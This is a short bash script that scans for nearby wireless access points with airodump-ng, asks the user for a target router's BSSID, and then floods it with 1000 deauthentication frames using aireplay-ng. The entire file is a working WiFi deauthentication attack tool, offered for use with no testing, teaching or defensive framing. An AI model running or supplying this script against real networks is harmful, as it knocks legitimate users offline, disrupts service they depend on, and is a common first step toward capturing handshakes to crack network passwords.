#! /bin/bash
echo "Enter your Wireless Interface: "
read INTER
echo "A scan will start, Please choose the BSSID of the router you wish to Deauth "
sleep 1 
sudo airodump-ng $INTER
echo "Enter target's BSSID"
read BSSID3
sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
